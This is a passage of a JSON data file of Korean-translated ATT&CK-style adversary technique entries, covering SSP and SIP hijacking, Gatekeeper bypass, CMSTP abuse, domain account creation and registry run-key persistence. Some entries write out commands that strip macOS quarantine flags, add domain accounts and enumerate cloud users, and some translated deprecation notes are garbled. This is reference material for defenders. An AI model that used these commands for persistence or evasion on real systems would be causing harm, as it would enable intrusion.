    "description": "Windows 보안 지원 제공자(SSP) DLL은 시스템 시작 시 로컬 보안 기관(LSA) 프로세스에 로드됩니다. LSA에 로드된 후, SSP DLL은 Windows에 저장된 암호화된 및 일반 텍스트 비밀번호에 접근할 수 있습니다. 여기에는 로그인된 사용자의 도메인 비밀번호나 스마트 카드 PIN이 포함됩니다. SSP 구성은 두 개의 레지스트리 키에 저장됩니다. 공격자는 이러한 레지스트리 키를 수정하여 새로운 SSP를 추가할 수 있으며, 이 경우 시스템이 다음에 부팅될 때 또는 AddSecurityPackage Windows API 함수가 호출될 때 새 SSP가 로드됩니다.",
    "external_id": "T1101",
    "modified": "2020-01-24T17:35:47.598Z",
    "translated": true
  },
  {
    "title": "LSASS Driver",
    "description": "Windows 보안 하위 시스템은 컴퓨터나 도메인에 대한 보안 정책을 관리하고 시행하는 구성 요소들의 집합입니다. 로컬 보안 권한(LSA)은 로컬 보안 정책 및 사용자 인증을 담당하는 주요 구성 요소입니다. LSA에는 다양한 다른 보안 기능과 연관된 여러 동적 링크 라이브러리(DLL)가 포함되어 있으며, 이 모든 것은 LSA 하위 시스템 서비스(LSASS) lsass.exe 프로세스의 컨텍스트에서 실행됩니다.\n\n적대자는 lsass.exe 드라이버를 겨냥하여 실행 및/또는 지속성을 확보할 수 있습니다. 불법적인 드라이버를 교체하거나 추가함으로써, 적대자는 LSA의 지속적인 작업으로 인해 유발되는 임의 코드 실행을 달성할 수 있습니다.",
    "external_id": "T1177",
    "modified": "2020-01-24T18:50:28.846Z",
    "translated": true
  },
  {
    "title": "Gatekeeper Bypass",
    "description": "macOS와 OS X에서는 인터넷에서 애플리케이션이나 프로그램을 다운로드할 때, 파일에 <code>com.apple.quarantine</code>라는 특별한 속성이 설정됩니다. 이 속성은 실행 시점에 애플의 Gatekeeper 방어 프로그램이 읽고, 사용자에게 실행 허용 여부를 묻는 메시지를 제공합니다.\n\nUSB 플래시 드라이브, 광 디스크, 외장 하드 드라이브 또는 로컬 네트워크를 통해 공유된 드라이브에서 시스템에 로드된 앱은 이 플래그를 설정하지 않습니다. 또한 드라이브 바이 다운로드와 같은 다른 유틸리티나 이벤트도 반드시 이 플래그를 설정하지 않습니다. 이렇게 하면 내장된 Gatekeeper 검사를 완전히 우회하게 됩니다. <code>xattr /path/to/MyApp.app</code> 명령어로 <code>com.apple.quarantine</code>의 존재 여부를 확인할 수 있습니다. 유사하게, sudo 접근 또는 상승된 권한이 주어지면 xattr를 사용하여 이 속성을 제거할 수 있습니다: <code>sudo xattr -r -d com.apple.quarantine /path/to/MyApp.app</code>.\n\n일반적으로 파일은 인터넷에서 다운로드되고 디스크에 저장되기 전에 격리 플래그가 설정됩니다. 사용자가 파일이나 애플리케이션을 열려고 할 때, macOS의 Gatekeeper가 개입하여 이 플래그의 존재 여부를 확인합니다. 이 플래그가 존재하면 macOS는 사용자가 프로그램을 실행하고 싶다는 Confirmation을 요청하며, 애플리케이션이 어디에서 온 것인지에 대한 URL도 제공합니다. 그러나 이는 모두 격리 기능이 있는 애플리케이션에서 다운로드된 파일을 기준으로 합니다.",
    "external_id": "T1144",
    "modified": "2020-02-05T16:23:01.683Z",
    "translated": true
  },
  {
    "title": "Software Packing",
    "description": "소프트웨어 패킹은 실행 파일을 압축하거나 암호화하는 방법입니다. 실행 파일을 패킹하면 파일 서명이 변경되어 서명 기반 탐지를 피하려고 합니다. 대부분의 압축 해제 기술은 메모리에서 실행 가능한 코드를 압축 해제합니다.\n\n소프트웨어 패킹을 수행하는 데 사용되는 유틸리티를 패커라고 합니다. 패커의 예로는 MPRESS와 UPX가 있습니다. 알려진 패커의 더 포괄적인 목록이 존재하지만, 적들은 잘 알려진 패커와 동일한 아티팩트를 남기지 않는 자신만의 패킹 기술을 만들어 방어를 회피할 수 있습니다.\n\n적들은 코드를 보호하기 위한 일종의 소프트웨어 패킹으로 가상 머신 소프트웨어 보호를 사용할 수 있습니다. 가상 머신 소프트웨어 보호는 실행 파일의 원래 코드를 특별한 형식으로 변환하며, 이는 특별한 가상 머신에서만 실행할 수 있습니다. 그 후 가상 머신이 이 코드를 실행하도록 호출됩니다.",
    "external_id": "T1045",
    "modified": "2020-02-05T14:18:21.533Z",
    "translated": true
  },
  {
    "title": "PowerShell Profile",
    "description": "적대자는 특정 상황에서 PowerShell 프로필을 악용하여 지속성을 확보하고 권한을 상승시킬 수 있습니다. PowerShell 프로필(profile.ps1)은 PowerShell이 시작할 때 실행되는 스크립트로, 사용자 환경을 맞춤화하는 로그인 스크립트로 사용할 수 있습니다. PowerShell은 사용자 또는 호스트 프로그램에 따라 여러 프로필을 지원합니다. 예를 들어, PowerShell 콘솔, PowerShell ISE 또는 Visual Studio Code와 같은 PowerShell 호스트 프로그램에 대해 서로 다른 프로필이 있을 수 있습니다. 관리자는 또한 로컬 컴퓨터의 모든 사용자와 호스트 프로그램에 적용되는 프로필을 구성할 수 있습니다.\n\n적대자는 이러한 프로필을 수정하여 원하는 명령, 함수, 모듈 및/또는 PowerShell 드라이브를 포함시켜 지속성을 확보할 수 있습니다. 사용자가 PowerShell 세션을 열 때마다 수정된 스크립트가 실행되며, 실행 시 -NoProfile 플래그가 사용되지 않는 한 이 스크립트를 실행하게 됩니다.\n\n적대자는 또한 PowerShell 프로필에서 스크립트가 로드되어 더 높은 권한을 가진 계정(예: 도메인 관리자)에 의해 실행되는 경우 권한 상승을 할 수 있습니다.",
    "external_id": "T1504",
    "modified": "2020-01-24T15:11:53.430Z",
    "translated": true
  },
  {
    "title": "SIP and Trust Provider Hijacking",
    "description": "사용자 모드에서 Windows Authenticode 디지털 서명은 파일의 출처와 무결성을 확인하는 데 사용되며, 이는 서명된 코드에 대한 신뢰를 구축하는 데 활용될 수 있습니다. 서명 유효성 검증 과정은 WinVerifyTrust API 함수에 의해 처리되며, 이는 질문을 수락하고 서명의 매개변수를 검증할 책임이 있는 적절한 신뢰 공급자와 조정합니다.\n\n실행 파일 유형과 해당 서명 형식이 다양하기 때문에, Microsoft는 API 함수와 파일 간의 추상화 계층을 제공하는 주제 인터페이스 패키지(SIP)라는 소프트웨어 구성 요소를 만들었습니다. SIP는 API 함수가 서명을 생성, 검색, 계산 및 검증할 수 있도록 할 책임이 있습니다. 대부분의 파일 형식에 대해 고유한 SIP가 존재하며, 전 세계적으로 고유한 식별자(GUID)로 식별됩니다.\n\n코드 서명과 유사하게, 공격자는 이 아키텍처를 악용하여 신뢰 제어를 무너뜨리고 시스템에서 합법적으로 서명된 코드만 실행할 수 있도록 하는 보안 정책을 우회할 수 있습니다. 공격자는 SIP 및 신뢰 공급자 구성 요소를 탈취하여 운영 체제 및 화이트리스트 도구가 악의적인 코드를 서명된 것으로 분류하도록 오도할 수 있습니다.\n\n* CryptSIPDllGetSignedDataMsg 함수의 동적 링크 라이브러리(DLL)를 제공하는 SIP의 Dll 및 FuncName 레지스트리 값을 수정하여, 항상 알려진 유효 서명 값을 반환하는 악의적으로 조작된 DLL을 가리키게 할 수 있습니다. 이를 통해 공격자는 모든 파일에 대해 수용 가능한 서명 값을 적용할 수 있습니다.\n* CryptSIPDllVerifyIndirectData 함수의 DLL을 제공하는 SIP의 Dll 및 FuncName 레지스트리 값을 수정하여, 항상 TRUE를 반환하는 악의적으로 조작된 DLL을 가리키게 할 수 있습니다. 이를 통해 공격자는 해당 SIP를 사용하는 모든 파일을 성공적으로 검증할 수 있습니다.\n* 신뢰 공급자의 FinalPolicy 함수를 제공하는 DLL의 DLL 및 Function 레지스트리 값을 수정하여, 디코딩 및 구문 분석된 서명이 확인되는 곳에서 신뢰 결정을 내릴 수 있습니다. \n* **참고:** 위의 탈취는 DLL 검색 순서 탈취를 통해 레지스트리를 수정하지 않고도 가능합니다.\n\nSIP 또는 신뢰 공급자 구성 요소를 탈취하면 지속적인 코드 실행이 가능해지며, 이러한 악성 구성 요소는 코드 서명 또는 서명 검증을 수행하는 모든 애플리케이션에 의해 호출될 수 있습니다.",
    "external_id": "T1198",
    "modified": "2020-02-05T19:35:58.954Z",
    "translated": true
  },
  {
    "title": "Domain Account",
    "description": "적대자는 피해 시스템에 대한 접근을 유지하기 위해 도메인 계정을 생성할 수 있습니다. 도메인 계정은 Active Directory 도메인 서비스에 의해 관리되며, 해당 도메인의 시스템 및 서비스 전반에 걸쳐 접근 및 권한이 구성됩니다. 도메인 계정은 사용자, 관리자 및 서비스 계정을 포함할 수 있습니다. 충분한 접근 수준이 있으면 도메인 계정을 생성하기 위해 <code>net user /add /domain</code> 명령을 사용할 수 있습니다.\n\n이러한 계정은 시스템에 지속적인 원격 접근 도구를 배포하지 않고도 보조 인증된 접근을 설정하는 데 사용될 수 있습니다.",
    "external_id": "T1136.002",
    "modified": "2024-02-01T04:37:36.774Z",
    "translated": true
  },
  {
    "title": "Component Object Model and Distributed COM",
    "description": "이 기술은 더 이상 사용되지 않습니다. 로컬 코드 실행이나 원격 시스템에서의 실행을 위해 Windows Component Object Model (COM)과 Distributed Component Object Model (DCOM)을 사용해야 합니다.\n\nCOM은 소프트웨어 객체 간의 상호작용을 가능하게 하는 Windows 애플리케이션 프로그래밍 인터페이스(API)의 구성 요소입니다. COM을 통해 클라이언트 객체는 일반적으로 동적 링크 라이브러리(DLL)나 실행 파일(EXE)인 서버 객체의 메서드를 호출할 수 있습니다. DCOM은 원격 프로시저 호출(RPC) 기술을 사용하여 COM의 기능을 로컬 컴퓨터를 넘어 확장하는 투명한 미들웨어입니다.\n\n로컬 및 원격 서버 COM 객체와 상호작용하기 위한 권한은 레지스트리의 접근 제어 목록(ACL)으로 지정됩니다. 기본적으로, 관리자는 DCOM을 통해 원격으로 COM 객체를 활성화하고 실행할 수 있습니다.\n\n적대 세력은 로컬 명령 및/또는 페이로드 실행을 위해 COM을 악용할 수 있습니다. 임의 실행을 유도하기 위해 다양한 프로그래밍 언어(C, C++, Java, VBScript 등)를 통해 악용될 수 있는 여러 COM 인터페이스가 노출되어 있습니다. 특정 COM 객체는 코드 실행을 넘어 일정 작업/작업 생성, 파일 없는 다운로드/실행 및 권한 상승, 지속성 같은 적대적 행동을 직접 수행할 수 있습니다.\n\n적대 세력은 DCOM을 통해 수평 이동을 할 수 있습니다. DCOM을 통해 적절한 권한이 있는 사용자 컨텍스트에서 운영되는 적대 세력은 Office 애플리케이션을 통해 임의 및 직접적인 쉘코드 실행을 원격으로 수행할 수 있으며, 안전하지 않은 방법을 포함하는 다른 Windows 객체에서도 실행할 수 있습니다. DCOM은 기존 문서에서 매크로를 실행할 수 있으며, 악성 문서 없이 Microsoft Office 애플리케이션의 COM 생성 인스턴스를 통해 동적 데이터 교환(DDE) 실행을 직접 유도할 수도 있습니다.",
    "external_id": "T1175",
    "modified": "2020-03-30T13:36:10.069Z",
    "translated": true
  },
  {
    "title": "Malware",
    "description": "적대자는 목표 타격 중에 사용할 수 있는 악성 소프트웨어를 구매, 도난 또는 다운로드할 수 있습니다. 악성 소프트웨어는 페이로드, 드로퍼, 침투 후 도구, 백도어, 패커, C2 프로토콜 등을 포함할 수 있습니다. 적대자는 원격 시스템을 제어하고 방어를 회피하며 침투 후 행동을 실행하기 위한 수단을 확보하기 위해 악성 소프트웨어를 획득할 수 있습니다.\n\n인터넷에서 무료 악성 소프트웨어를 다운로드하는 것 외에도, 적대자는 제3자 기관으로부터 이러한 기능을 구매할 수 있습니다. 제3자 기관은 악성 소프트웨어 개발을 전문으로 하는 기술 회사, 범죄 시장(악성 소프트웨어를 서비스 형태로 제공하는 것 포함), 또는 개인을 포함할 수 있습니다. 악성 소프트웨어를 구매하는 것 외에도, 적대자는 제3자 기관(다른 적대자를 포함)으로부터 악성 소프트웨어를 도난하거나 재활용할 수 있습니다.",
    "external_id": "T1588.001",
    "modified": "2021-10-17T16:15:52.805Z",
    "translated": true
  },
  {
    "title": "Virtual Private Server",
    "description": "적대자는 타겟팅 중에 사용할 수 있는 가상 사설 서버(VPS)를 임대할 수 있습니다. 다양한 클라우드 서비스 제공업체가 서비스로서 가상 머신/컨테이너를 판매하고 있습니다. VPS를 활용함으로써 적대자는 그들의 활동을 물리적으로 연결짓는 것을 어렵게 만들 수 있습니다. 클라우드 인프라의 사용은 적대자가 자신들의 인프라를 신속하게 구성하고 수정하며 종료하는 것을 더 쉽게 만들 수 있습니다.\n\n명령 및 제어와 같은 적대자의 생애 주기 후반 단계에서 사용할 VPS를 확보하는 것은, 유명한 클라우드 서비스 제공업체와의 보편성과 신뢰를 이득으로 삼을 수 있게 해줍니다. 적대자는 최소한의 등록 정보로 VPS를 임대하는 것으로 유명한 VPS 서비스 제공업체로부터 인프라를 확보할 수도 있으며, 이는 인프라의 보다 익명적인 확보를 가능하게 합니다.",
    "external_id": "T1583.003",
    "modified": "2024-10-15T13:22:11.113Z",
    "translated": true
  },
  {
    "title": "Application Shimming",
    "description": "Microsoft Windows 애플리케이션 호환성 인프라/프레임워크(애플리케이션 쉼)는 운영 체제 코드베이스가 시간이 지남에 따라 변경될 때 소프트웨어의 하위 호환성을 허용하기 위해 만들어졌습니다. 애플리케이션 쉼 기능은 개발자가 Windows XP용으로 제작된 애플리케이션에 수정 사항을 적용할 수 있도록 하여 Windows 10에서도 작동할 수 있게 합니다. 이 프레임워크 내에서 쉼은 프로그램(또는 더 구체적으로는 가져오기 주소 테이블)과 Windows OS 간의 버퍼 역할을 하도록 생성됩니다. 프로그램이 실행되면, 쉼 캐시가 참조되어 프로그램이 쉼 데이터베이스(.sdb)를 사용할 필요가 있는지 여부를 결정합니다. 만약 필요하다면, 쉼 데이터베이스는 코드가 OS와 통신할 수 있도록 필요에 따라 코드를 리다이렉션하는 작업을 수행합니다.\n\n현재 기본 Windows 설치 프로그램(sdbinst.exe)에 의해 설치된 모든 쉼의 목록은 다음과 같이 유지됩니다:\n\n* %WINDIR%\\AppPatch\\sysmain.sdb\n* hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\installedsdb\n\n사용자 지정 데이터베이스는 다음에 저장됩니다:\n\n* %WINDIR%\\AppPatch\\custom 및 %WINDIR%\\AppPatch\\AppPatch64\\Custom\n* hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\custom\n\n쉼을 안전하게 유지하기 위해 Windows는 이들이 사용자 모드에서 실행되도록 설계하였으며, 이는 커널을 수정할 수 없고 쉼을 설치하기 위해서는 관리자 권한이 필요합니다. 그러나 특정 쉼은 사용자 계정 컨트롤(UAC)을 우회하거나(DynamicEXE), DLL을 프로세스에 주입하거나(InjectDLL), 데이터 실행 방지 기능을 비활성화하거나(DisableNX) 구조적 예외 처리를 비활성화하고(DisableSEH), 메모리 주소를 가로채는(GetProcAddress) 등의 기능을 수행할 수 있습니다. 이러한 쉼을 활용하면 공격자가 권한 상승, 백도어 설치, Windows Defender와 같은 방어 수단 비활성화 등의 악의적인 행위를 수행할 수 있는 가능성이 있습니다.",
    "external_id": "T1138",
    "modified": "2020-11-10T18:29:30.362Z",
    "translated": true
  },
  {
    "title": "CMSTP",
    "description": "Microsoft 연결 관리자 프로필 설치 프로그램(CMSTP.exe)은 연결 관리자 서비스 프로필을 설치하는 데 사용되는 명령줄 프로그램입니다. CMSTP.exe는 설치 정보 파일(INF)을 매개변수로 받아 원격 액세스 연결에 활용되는 서비스 프로필을 설치합니다.\n\n적대자는 CMSTP.exe에 악성 명령으로 감염된 INF 파일을 제공할 수 있습니다. CMSTP.exe는 DLL 또는 원격 서버에서 COM 스크립틀렛(SCT)을 로드하고 실행하는 데 악용될 수 있으며, 이는 정품이며 서명된 Microsoft 애플리케이션이기 때문에 AppLocker 및 기타 화이트리스트 방어를 우회할 수 있습니다.\n\nCMSTP.exe는 또한 사용자 계정 제어를 우회하고 악성 INF를 통해 자율 상승된 COM 인터페이스에서 임의 명령을 실행하는 데 악용될 수 있습니다.",
    "external_id": "T1191",
    "modified": "2020-01-31T18:58:17.078Z",
    "translated": true
  },
  {
    "title": "Multi-hop Proxy",
    "description": "악의적인 트래픽의 출처를 숨기기 위해, 공격자들은 여러 개의 프록시를 연결할 수 있다. 일반적으로 방어자는 자신의 네트워크에 들어오기 전에 마지막 프록시를 통해 전달된 트래픽을 식별할 수 있지만, 마지막 홉 프록시 이전의 다른 프록시를 식별할 수 있을지 아닐지는 불확실하다. 이 기술은 방어자가 악의적인 트래픽의 출처를 식별하기 위해 여러 프록시를 통해 악의적인 트래픽을 추적해야 하므로 원래 출처를 식별하는 것을 더욱 어렵게 만든다.",
    "external_id": "T1188",
    "modified": "2020-03-14T23:25:20.928Z",
    "translated": true
  },
  {
    "title": "Scripting",
    "description": "이 기술은 더 이상 사용되지 않습니다. 적절한 경우 명령 및 스크립트 인터프리터를 사용하십시오.\n\n적대자는 스크립트를 사용하여 작업을 지원하고 수동으로 수행해야 하는 여러 작업을 수행할 수 있습니다. 스크립팅은 운영 작업을 가속화하고 중요한 리소스에 접근하는 데 필요한 시간을 줄이는 데 유용합니다. 일부 스크립팅 언어는 다른 프로그램을 호출하는 대신 API 수준에서 운영 체제와 직접 상호 작용하여 프로세스 모니터링 메커니즘을 우회하는 데 사용될 수 있습니다. Windows에서 일반적으로 사용되는 스크립팅 언어에는 VBScript와 PowerShell이 포함되지만 명령줄 배치 스크립트 형태로도 존재할 수 있습니다.\n\n스크립트는 Office 문서 내에 매크로로 포함될 수 있으며, 이는 스피어피싱 첨부파일 및 기타 유형의 스피어피싱으로 사용되는 파일이 열릴 때 실행되도록 설정할 수 있습니다. 악성 매크로의 포함은 클라이언트 실행을 위한 악용을 통한 소프트웨어 악용과는 다른 실행 수단으로, 적대자는 매크로가 허용되거나 사용자가 활성화를 수락할 것에 의존합니다.\n\n보안 테스트자와 적대자 모두를 위한 다양한 인기 있는 공격 프레임워크가 존재합니다. Metasploit, Veil, PowerSploit는 펜테이션 테스터들 사이에서 악용 및 후속 작업에 인기 있는 세 가지 예시로, 방어를 회피하기 위한 많은 기능을 포함하고 있습니다. 일부 적대자는 PowerShell을 사용하는 것으로 알려져 있습니다.",
    "external_id": "T1064",
    "modified": "2020-03-30T13:39:24.852Z",
    "translated": true
  },
  {
    "title": "Shared Webroot",
    "description": "**이 기술은 더 이상 사용되지 않아야 합니다.**\n\n적대자는 웹사이트의 웹 루트 또는 웹 콘텐츠 디렉토리가 포함된 열린 네트워크 파일 공유를 통해 내부에서 접근 가능한 웹사이트에 악성 콘텐츠를 추가할 수 있습니다. 그런 다음 웹 브라우저를 통해 해당 콘텐츠를 탐색하여 서버가 악성 콘텐츠를 실행하도록 유도할 수 있습니다. 악성 콘텐츠는 일반적으로 웹 서버 프로세스의 컨텍스트와 권한 하에서 실행되며, 이는 웹 서버가 어떻게 구성되었느냐에 따라 로컬 시스템 또는 관리자 권한을 가져올 수 있습니다.\n\n이러한 공유 접근 및 원격 실행 메커니즘은 웹 서버가 실행되는 시스템으로의 수평 이동에 활용될 수 있습니다. 예를 들어, 열린 네트워크 공유가 있는 PHP 웹 서버는 적대자가 원격 접근 도구와 PHP 스크립트를 업로드하도록 허용할 수 있으며, 특정 페이지가 방문될 때 해당 시스템에서 RAT를 실행할 수 있습니다.",
    "external_id": "T1051",
    "modified": "2024-09-04T21:41:21.642Z",
    "translated": true
  },
  {
    "title": "Spearphishing Attachment",
    "description": "적대 세력은 민감한 정보를 유출하기 위해 악성 첨부파일이 포함된 스피어피싱 메시지를 보낼 수 있습니다. 정보에 대한 스피어피싱은 대상을 속여 종종 자격 증명이나 기타 실행 가능한 정보를 누설하도록 유도하는 시도를 의미합니다. 정보에 대한 스피어피싱은 종종 정보를 수집할 이유가 있는 출처를 가장하는 등의 사회적 공학 기법을 포함하며, 여러 개의 긴급한 메시지를 보내는 방식이 일반적입니다.\n\n모든 형태의 스피어피싱은 특정 개인, 회사 또는 산업을 대상으로 하는 전자적으로 전달되는 사회적 공학입니다. 이 시나리오에서 적대 세력은 스피어피싱 이메일에 파일을 첨부하고 일반적으로 수신자가 정보를 입력한 후 파일을 반송하도록 의존합니다. 스피어피싱 이메일의 텍스트는 일반적으로 파일을 작성해야 하는 그럴듯한 이유를 제시하려고 하며, 비즈니스 파트너의 정보 요청과 같은 형식을 취할 수 있습니다. 적대 세력은 이전 정찰 작업에서 얻은 정보를 활용하여 설득력 있고 믿을 만한 유인을 만드는 데 사용할 수도 있습니다.",
    "external_id": "T1598.002",
    "modified": "2024-05-31T04:18:44.568Z",
    "translated": true
  },
  {
    "title": "Control Panel Items",
    "description": "Windows 제어판 항목은 사용자가 컴퓨터 설정을 보고 조정할 수 있도록 하는 유틸리티입니다. 제어판 항목은 실행 파일(.exe) 또는 제어판(.cpl) 파일로 등록되어 있으며, 후자는 실제로 CPlApplet 함수를 내보내는 이름이 변경된 동적 링크 라이브러리(.dll) 파일입니다. 제어판 항목은 명령줄에서 직접 실행하거나, 응용 프로그래밍 인터페이스(API) 호출을 통해 프로그래밍적으로, 또는 파일을 더블 클릭하여 실행할 수 있습니다.\n\n사용의 용이성을 위해 제어판 항목은 일반적으로 등록되고 제어판에 로드된 후 사용자에게 제공되는 그래픽 메뉴를 포함합니다.\n\n적대자는 제어판 항목을 실행 페이로드로 사용하여 임의의 명령을 실행할 수 있습니다. 악성 제어판 항목은 스피어피싱 첨부 파일 캠페인을 통해 배포되거나 다단계 악성코드의 일부로 실행될 수 있습니다. 제어판 항목, 특히 CPL 파일은 애플리케이션 및/또는 파일 확장자 화이트리스트를 우회할 수 있습니다.",
    "external_id": "T1196",
    "modified": "2020-01-31T18:59:21.682Z",
    "translated": true
  },
  {
    "title": "Cloud Account",
    "description": "적대자는 클라우드 계정 목록을 얻으려 할 수 있습니다. 클라우드 계정은 조직이 사용자, 원격 지원, 서비스 또는 클라우드 서비스 제공업체 또는 SaaS 애플리케이션 내 리소스 관리 용도로 생성 및 구성한 계정입니다.\n\n인증된 접근을 통해 계정을 찾는 데 사용할 수 있는 여러 도구가 있습니다. PowerShell cmdlet인 `Get-MsolRoleMember`를 사용하여 Office 365에서 역할이나 권한 그룹을 기반으로 계정 이름을 얻을 수 있습니다. Azure CLI(AZ CLI)도 인증된 접근 권한을 가진 사용자 계정을 도메인에서 얻기 위한 인터페이스를 제공합니다. `az ad user list` 명령은 도메인 내의 모든 사용자를 나열합니다.\n\nAWS 명령인 `aws iam list-users`를 사용하여 현재 계정의 사용자 목록을 얻을 수 있으며, `aws iam list-roles`는 지정된 경로 접두사를 가진 IAM 역할을 얻는 데 사용할 수 있습니다. GCP에서는 `gcloud iam service-accounts list`와 `gcloud projects get-iam-policy`를 사용하여 프로젝트 내의 서비스 계정과 사용자의 목록을 얻을 수 있습니다.",
    "external_id": "T1087.004",
    "modified": "2024-10-15T15:51:18.808Z",
    "translated": true
  },
  {
    "title": "Launchd",
    "description": "이 기술은 부정확한 사용으로 인해 사용되지 않습니다. 인용된 보고서는 악성 코드가 알려진 서비스 경유가 아닌 launchd와 직접 상호작용하는 방법에 대한 기술적 세부정보를 제공하지 않았습니다. 다른 시스템 서비스가 launchd와 상호작용하는 데 사용되며, launchd 자체가 독립적으로 사용되지는 않습니다.\n\n적대자는 <code>Launchd</code> 데몬을 악성 코드의 초기 실행 또는 반복 실행을 위한 작업 예약에 악용할 수 있습니다. macOS의 네이티브인 <code>launchd</code> 데몬은 운영 체제 내에서 서비스를 로드하고 유지하는 역할을 합니다. 이 과정은 <code>/System/Library/LaunchDaemons</code> 및 <code>/Library/LaunchDaemons</code>에 있는 속성 목록(plist) 파일에서 각 요청 시 시스템 수준 데몬에 대한 매개 변수를 로드합니다. 이러한 LaunchDaemons는 실행될 실행 파일을 가리키는 속성 목록 파일을 가지고 있습니다.\n\n적대자는 macOS 환경에서 <code>launchd</code> 데몬을 사용하여 시스템 시작 시 또는 일정에 따라 새 실행 파일을 실행하도록 예약하여 지속성을 유지할 수 있습니다. <code>launchd</code>는 특정 계정의 컨텍스트에서 프로세스를 실행하도록 악용될 수도 있습니다. <code>launchd</code>와 같은 데몬은 루트 사용자 계정의 권한으로 실행되며, 어떤 사용자 계정이 로그인되어 있는지와 관계없이 작동합니다.",
    "external_id": "T1053.004",
    "modified": "2021-10-07T21:38:03.610Z",
    "translated": true
  },
  {
    "title": "Input Prompt",
    "description": "추가 권한이 필요한 프로그램이 실행될 때 현재 사용자 컨텍스트의 권한보다 더 높은 권한을 요구하는 경우, 운영 체제는 사용자가 작업을 위한 권한 상승을 인증할 수 있도록 적절한 자격 증명을 요청하는 것이 일반적입니다. \n\n적대 세력은 이러한 기능을 모방하여 사용자를 자격 증명을 요청하도록 유도할 수 있으며, 이는 추가 접근을 요구하는 가짜 설치 프로그램이나 가짜 악성코드 제거 도구와 같이 정상적인 사용을 모방하는 여러 가지 이유로 발생할 수 있습니다. 이와 같은 프롬프트는 다양한 언어를 통해 자격 증명을 수집하는 데 사용될 수 있습니다.",
    "external_id": "T1141",
    "modified": "2020-02-12T16:34:06.412Z",
    "translated": true
  },
  {
    "title": "Cloud Accounts",
    "description": "적대자는 타겟팅 중에 사용할 수 있는 클라우드 공급자 계정을 생성할 수 있습니다. 적대자는 클라우드 계정을 사용하여 Dropbox, MEGA, Microsoft OneDrive 또는 AWS S3 버킷과 같은 클라우드 스토리지 서비스를 활용하여 정보 유출을 하거나 도구를 업로드하는 등의 작업을 진행할 수 있습니다. 클라우드 계정은 가상 사설 서버나 서버리스 인프라와 같은 인프라를 획득하는 데에도 사용될 수 있습니다. 클라우드 계정을 설립하면 적대자는 자신의 서버를 관리하지 않고도 정교한 기능을 개발할 수 있습니다.\n\n클라우드 계정을 생성하는 것은 적대자가 클라우드 공급자에 등록하기 위해 이메일 계정을 설정해야 할 수도 있음을 의미합니다.",
    "external_id": "T1585.003",
    "modified": "2022-10-25T15:49:14.785Z",
    "translated": true
  },
  {
    "title": "Registry Run Keys / Startup Folder",
    "description": "적대자는 시작 폴더에 프로그램을 추가하거나 레지스트리 실행 키를 참조함으로써 지속성을 유지할 수 있습니다. 레지스트리의 \"실행 키\"에 항목을 추가하거나 시작 폴더에 항목을 추가하면 사용자가 로그인할 때 참조된 프로그램이 실행됩니다. 이러한 프로그램은 사용자의 맥락에서 실행되며 해당 계정의 권한 수준에 따라 실행됩니다.\n\n시작 폴더에 프로그램을 배치하면 사용자가 로그인할 때 해당 프로그램이 실행됩니다. 개인 사용자 계정에 대한 시작 폴더 위치와 모든 사용자 계정에 대한 시스템 전체의 시작 폴더가 있으며, 이는 어떤 사용자 계정이 로그인하든 확인됩니다.\n\n현재 사용자의 시작 폴더 경로는:\n* C:\\Users\\[사용자 이름]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\n모든 사용자의 시작 폴더 경로는:\n* C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\n\n다음의 실행 키는 Windows 시스템에서 기본적으로 생성됩니다:\n* HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n* HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n* HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n* HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx도 사용 가능하지만, Windows Vista 및 이후 버전에서는 기본적으로 생성되지 않습니다. 레지스트리 실행 키 항목은 프로그램을 직접 참조하거나 종속성을 나열할 수 있습니다.\n\n다음 레지스트리 키는 지속성을 위한 시작 폴더 항목을 설정하는 데 사용할 수 있습니다:\n* HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\n* HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\n* HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\n* HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\n\n다음 레지스트리 키는 부팅 중 서비스의 자동 시작을 제어할 수 있습니다:\n* HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\n* HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\n* HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\n* HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\n\n정책 설정을 사용하여 시작 프로그램을 지정하면 두 개의 레지스트리 키 중 하나에 해당 값을 생성합니다:\n* HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\n* HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\n\nWinlogon 키는 사용자가 Windows 7이 실행되는 컴퓨터에 로그인할 때 발생하는 작업을 제어합니다. 이러한 작업의 대부분은 운영 체제에 의해 제어되지만, 여기에서 사용자 정의 작업을 추가할 수도 있습니다. HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit 및 HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell 하위 키는 프로그램을 자동으로 실행할 수 있습니다.\n\n레지스트리 키 HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows의 로드 값에 나열된 프로그램은 어떤 사용자가 로그인할 때 실행됩니다.\n\n기본적으로 레지스트리 키 HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager의 멀티 스트링 BootExecute 값은 autocheck autochk *로 